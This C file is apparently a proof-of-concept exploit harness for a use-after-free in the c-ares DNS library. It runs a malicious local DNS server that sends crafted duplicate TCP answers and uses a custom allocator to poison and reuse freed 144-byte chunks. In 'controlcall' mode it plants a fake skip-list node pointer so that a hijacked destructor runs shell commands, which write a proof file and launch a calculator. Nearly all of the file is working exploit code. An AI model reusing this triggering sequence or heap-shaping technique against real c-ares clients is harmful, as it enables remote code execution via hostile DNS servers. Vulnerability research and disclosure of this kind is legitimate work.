#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>

#include "ares.h"

typedef struct {
  int port;
  int ready_fd;
  int udp_start;
} server_ctx_t;

typedef struct tracked_hdr {
  size_t size;
  uint64_t magic;
  struct tracked_hdr *next;
  uint64_t pad;
} tracked_hdr_t;

typedef void (*proof_destructor_t)(void *);

typedef struct proof_slist {
  void *rand_state;
  unsigned char rand_data[8];
  size_t rand_bits;
  void *head;
  size_t levels;
  void *tail;
  void *cmp;
  proof_destructor_t destruct;
  size_t cnt;
} proof_slist_t;

typedef struct proof_slist_node {
  void *data;
  struct proof_slist_node **prev;
  struct proof_slist_node **next;
  size_t levels;
  proof_slist_t *parent;
} proof_slist_node_t;

static int use_poison_allocator;
static int trace_allocator;
static int reuse_144;
static int control_call;
static unsigned char poison_byte = 0x43;
static tracked_hdr_t *free144;
static size_t alloc_seq;
static proof_slist_t *proof_list;
static proof_slist_node_t *proof_node;

static int should_shape_size(size_t size)
{
  return size == 144;
}

static void proof_marker(void *arg)
{
  const char msg[] = "CARES_RCE_PAYLOAD_TRIGGERED\n";
  const char cmd[] =
      "proof=/tmp/cares_rce_proof_${PPID}; "
      "printf 'c-ares control-flow payload reached pid=%s\\n' \"$$\" > \"$proof\"; "
      "ln -sf \"$proof\" /tmp/cares_rce_proof_latest 2>/dev/null || true; "
      "if [ -x /mnt/c/Windows/System32/cmd.exe ]; then "
      "  /mnt/c/Windows/System32/calc.exe >/dev/null 2>&1 || "
      "  /mnt/c/Windows/System32/cmd.exe /c start \"\" calc.exe >/dev/null 2>&1; "
      "elif [ -x /mnt/c/Windows/System32/calc.exe ]; then "
      "  /mnt/c/Windows/System32/calc.exe >/dev/null 2>&1; "
      "elif command -v xcalc >/dev/null 2>&1; then "
      "  xcalc >/dev/null 2>&1 & "
      "elif command -v gnome-calculator >/dev/null 2>&1; then "
      "  gnome-calculator >/dev/null 2>&1 & "
      "elif command -v kcalc >/dev/null 2>&1; then "
      "  kcalc >/dev/null 2>&1 & "
      "fi";
  pid_t pid;
  (void)arg;
  write(STDERR_FILENO, msg, sizeof(msg) - 1);
  pid = fork();
  if (pid == 0) {
    execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    waitpid(pid, NULL, 0);
  }
  _exit(77);
}

static void *tracked_malloc(size_t size)
{
  tracked_hdr_t *hdr;
  if (reuse_144 && size == 144 && free144 != NULL) {
    hdr = free144;
    free144 = hdr->next;
    hdr->next = NULL;
    memset(hdr + 1, 0x52, size);
    if (trace_allocator) {
      fprintf(stderr, "ALLOC%zu reuse144 %p\n", ++alloc_seq, (void *)(hdr + 1));
    }
    return hdr + 1;
  }
  hdr = (tracked_hdr_t *)malloc(sizeof(*hdr) + size);
  if (hdr == NULL) {
    return NULL;
  }
  hdr->size = size;
  hdr->magic = 0xc0decafef00dbeefu;
  hdr->next = NULL;
  memset(hdr + 1, 0x55, size);
  if (trace_allocator && should_shape_size(size)) {
    fprintf(stderr, "ALLOC%zu size%zu %p\n", ++alloc_seq, size,
            (void *)(hdr + 1));
  }
  return hdr + 1;
}

static void ensure_proof_node(void)
{
  if (proof_list != NULL && proof_node != NULL) {
    return;
  }
  proof_list = (proof_slist_t *)tracked_malloc(sizeof(*proof_list));
  proof_node = (proof_slist_node_t *)tracked_malloc(sizeof(*proof_node));
  if (proof_list == NULL || proof_node == NULL) {
    abort();
  }
  memset(proof_list, 0, sizeof(*proof_list));
  memset(proof_node, 0, sizeof(*proof_node));
  proof_list->destruct = proof_marker;
  proof_list->cnt = 1;
  proof_node->data = proof_list;
  proof_node->levels = 0;
  proof_node->parent = proof_list;
}

static void tracked_free(void *ptr)
{
  tracked_hdr_t *hdr;
  if (ptr == NULL) {
    return;
  }
  hdr = ((tracked_hdr_t *)ptr) - 1;
  if (hdr->magic != 0xc0decafef00dbeefu) {
    abort();
  }
  if (trace_allocator && should_shape_size(hdr->size)) {
    fprintf(stderr, "FREE size%zu %p\n", hdr->size, ptr);
  }
  if (control_call && should_shape_size(hdr->size)) {
    ensure_proof_node();
    memset(ptr, 0, hdr->size);
    memcpy((unsigned char *)ptr + 48, &proof_node, sizeof(proof_node));
  } else {
    memset(ptr, poison_byte, hdr->size);
  }
  if (reuse_144 && hdr->size == 144) {
    hdr->next = free144;
    free144 = hdr;
  }
}

static void *tracked_realloc(void *ptr, size_t size)
{
  tracked_hdr_t *old_hdr;
  void *new_ptr;
  size_t copy_len;
  if (ptr == NULL) {
    return tracked_malloc(size);
  }
  if (size == 0) {
    tracked_free(ptr);
    return NULL;
  }
  old_hdr = ((tracked_hdr_t *)ptr) - 1;
  if (old_hdr->magic != 0xc0decafef00dbeefu) {
    abort();
  }
  new_ptr = tracked_malloc(size);
  if (new_ptr == NULL) {
    return NULL;
  }
  copy_len = old_hdr->size < size ? old_hdr->size : size;
  memcpy(new_ptr, ptr, copy_len);
  tracked_free(ptr);
  return new_ptr;
}

static void load_poison_byte(void)
{
  const char *env = getenv("CARES_PROOF_POISON_BYTE");
  char *end = NULL;
  unsigned long value;
  trace_allocator = getenv("CARES_PROOF_TRACE_ALLOC") != NULL;
  if (env == NULL || *env == '\0') {
    return;
  }
  value = strtoul(env, &end, 0);
  if (end != env && value <= 255) {
    poison_byte = (unsigned char)value;
  }
}


static int read_exact(int fd, unsigned char *buf, size_t len)
{
  size_t off = 0;
  while (off < len) {
    ssize_t n = recv(fd, buf + off, len - off, 0);
    if (n <= 0) {
      return -1;
    }
    off += (size_t)n;
  }
  return 0;
}

static size_t question_len(const unsigned char *msg, size_t len)
{
  size_t pos = 12;
  if (len < pos) {
    return 0;
  }
  while (pos < len && msg[pos] != 0) {
    unsigned int l = msg[pos++];
    if (l > 63 || pos + l > len) {
      return 0;
    }
    pos += l;
  }
  if (pos + 5 > len) {
    return 0;
  }
  return pos + 5 - 12;
}

static size_t make_dns(unsigned char *out, const unsigned char *query,
                       size_t query_len, unsigned char high_flags,
                       unsigned char low_flags, int tcp)
{
  size_t qlen = question_len(query, query_len);
  size_t dns_len = 12 + qlen;
  size_t off = tcp ? 2 : 0;
  if (qlen == 0) {
    return 0;
  }
  if (tcp) {
    out[0] = (unsigned char)(dns_len >> 8);
    out[1] = (unsigned char)(dns_len & 0xffu);
  }
  out[off + 0] = query[0];
  out[off + 1] = query[1];
  out[off + 2] = high_flags;
  out[off + 3] = low_flags;
  out[off + 4] = 0;
  out[off + 5] = 1;
  out[off + 6] = 0;
  out[off + 7] = 0;
  out[off + 8] = 0;
  out[off + 9] = 0;
  out[off + 10] = 0;
  out[off + 11] = 0;
  memcpy(out + off + 12, query + 12, qlen);
  return off + dns_len;
}

static void *server_thread(void *arg)
{
  server_ctx_t *ctx = (server_ctx_t *)arg;
  int s = -1;
  int u = -1;
  int c = -1;
  struct sockaddr_in sin;
  struct sockaddr_in peer;
  socklen_t slen;
  socklen_t plen;
  unsigned char hdr[2];
  unsigned char query[4096];
  unsigned char out[8192];
  unsigned char retry[4096];
  uint16_t qlen;
  size_t n1;
  size_t n2;
  struct linger linger_opt;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    return NULL;
  }
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sin.sin_port = 0;
  if (bind(s, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
    close(s);
    return NULL;
  }
  if (listen(s, 1) != 0) {
    close(s);
    return NULL;
  }
  slen = sizeof(sin);
  if (getsockname(s, (struct sockaddr *)&sin, &slen) != 0) {
    close(s);
    return NULL;
  }
  ctx->port = ntohs(sin.sin_port);
  if (ctx->udp_start) {
    u = socket(AF_INET, SOCK_DGRAM, 0);
    if (u < 0) {
      close(s);
      return NULL;
    }
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sin.sin_port = htons((uint16_t)ctx->port);
    if (bind(u, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
      close(u);
      close(s);
      return NULL;
    }
  }
  write(ctx->ready_fd, "R", 1);

  if (ctx->udp_start) {
    plen = sizeof(peer);
    ssize_t got = recvfrom(u, query, sizeof(query), 0,
                           (struct sockaddr *)&peer, &plen);
    if (got > 0) {
      n1 = make_dns(out, query, (size_t)got, 0x83, 0, 0);
      if (n1 != 0) {
        sendto(u, out, n1, MSG_NOSIGNAL, (struct sockaddr *)&peer, plen);
      }
    }
    close(u);
  }

  c = accept(s, NULL, NULL);
  if (c < 0) {
    close(s);
    return NULL;
  }
  if (read_exact(c, hdr, sizeof(hdr)) != 0) {
    close(c);
    close(s);
    return NULL;
  }
  qlen = (uint16_t)(((unsigned int)hdr[0] << 8) | hdr[1]);
  if (qlen > sizeof(query) || read_exact(c, query, qlen) != 0) {
    close(c);
    close(s);
    return NULL;
  }
  n1 = make_dns(out, query, qlen, 0x81, 1, 1);
  n2 = make_dns(out + n1, query, qlen, 0x81, 0, 1);
  if (n1 != 0 && n2 != 0) {
    send(c, out, n1 + n2, MSG_NOSIGNAL);
  }
  if (read_exact(c, hdr, sizeof(hdr)) == 0) {
    qlen = (uint16_t)(((unsigned int)hdr[0] << 8) | hdr[1]);
    if (qlen <= sizeof(retry)) {
      read_exact(c, retry, qlen);
    }
  }
  linger_opt.l_onoff = 1;
  linger_opt.l_linger = 0;
  setsockopt(c, SOL_SOCKET, SO_LINGER, &linger_opt, sizeof(linger_opt));
  close(c);
  close(s);
  return NULL;
}

static void ai_cb(void *arg, int status, int timeouts,
                  struct ares_addrinfo *res)
{
  int *done = (int *)arg;
  (void)status;
  (void)timeouts;
  if (res != NULL) {
    ares_freeaddrinfo(res);
  }
  *done = 1;
}

int main(int argc, char **argv)
{
  int pipefd[2];
  pthread_t tid;
  server_ctx_t ctx;
  ares_channel_t *channel = NULL;
  struct ares_options opts;
  struct ares_addrinfo_hints hints;
  char *search_domains[] = { (char *)"uaf.invalid" };
  int optmask = ARES_OPT_FLAGS | ARES_OPT_LOOKUPS | ARES_OPT_DOMAINS;
  char server[64];
  int done = 0;
  int loops = 0;
  int drain_after_done = 0;
  char ch;

  signal(SIGPIPE, SIG_IGN);
  memset(&ctx, 0, sizeof(ctx));
  if (argc > 1 && strcmp(argv[1], "udp") == 0) {
    ctx.udp_start = 1;
  }
  if (argc > 1 && strcmp(argv[1], "poison") == 0) {
    use_poison_allocator = 1;
  }
  if (argc > 1 && strcmp(argv[1], "reuse144") == 0) {
    use_poison_allocator = 1;
    reuse_144 = 1;
  }
  if (argc > 1 && strcmp(argv[1], "controlcall") == 0) {
    use_poison_allocator = 1;
    control_call = 1;
  }
  if (argc > 2 && strcmp(argv[2], "poison") == 0) {
    use_poison_allocator = 1;
  }
  if (argc > 2 && strcmp(argv[2], "reuse144") == 0) {
    use_poison_allocator = 1;
    reuse_144 = 1;
  }
  if (argc > 2 && strcmp(argv[2], "controlcall") == 0) {
    use_poison_allocator = 1;
    control_call = 1;
  }
  load_poison_byte();
  if (pipe(pipefd) != 0) {
    return 2;
  }
  ctx.ready_fd = pipefd[1];
  if (pthread_create(&tid, NULL, server_thread, &ctx) != 0) {
    return 2;
  }
  if (read(pipefd[0], &ch, 1) != 1) {
    return 2;
  }
  close(pipefd[0]);
  close(pipefd[1]);

  if (use_poison_allocator) {
    if (trace_allocator) {
      fprintf(stderr, "allocator mode poison=%02x reuse144=%d\n",
              (unsigned int)poison_byte, reuse_144);
    }
    ares_library_init_mem(ARES_LIB_INIT_ALL, tracked_malloc, tracked_free,
                          tracked_realloc);
  } else {
    ares_library_init(ARES_LIB_INIT_ALL);
  }
  memset(&opts, 0, sizeof(opts));
  opts.flags = ARES_FLAG_EDNS;
  if (!ctx.udp_start) {
    opts.flags |= ARES_FLAG_USEVC;
  }
  opts.lookups = (char *)"b";
  opts.domains = search_domains;
  opts.ndomains = 1;
  if (ares_init_options(&channel, &opts, optmask) != ARES_SUCCESS ||
      channel == NULL) {
    return 2;
  }
  snprintf(server, sizeof(server), "127.0.0.1:%d", ctx.port);
  if (ares_set_servers_ports_csv(channel, server) != ARES_SUCCESS) {
    return 2;
  }
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  ares_getaddrinfo(channel, "example.com", "80", &hints, ai_cb, &done);

  if (control_call) {
    drain_after_done = 8;
  }
  while ((!done || drain_after_done-- > 0) && loops++ < 120) {
    fd_set rfds;
    fd_set wfds;
    int nfds;
    struct timeval tv;
    struct timeval *tvp;
    FD_ZERO(&rfds);
    FD_ZERO(&wfds);
    nfds = ares_fds(channel, &rfds, &wfds);
    if (nfds == 0) {
      break;
    }
    tvp = ares_timeout(channel, NULL, &tv);
    if (done && control_call && tvp != NULL &&
        (tvp->tv_sec > 0 || tvp->tv_usec > 10000)) {
      tvp->tv_sec = 0;
      tvp->tv_usec = 10000;
    }
    select(nfds, &rfds, &wfds, NULL, tvp);
    ares_process(channel, &rfds, &wfds);
  }

  ares_destroy(channel);
  ares_library_cleanup();
  pthread_join(tid, NULL);
  return done ? 0 : 1;
}
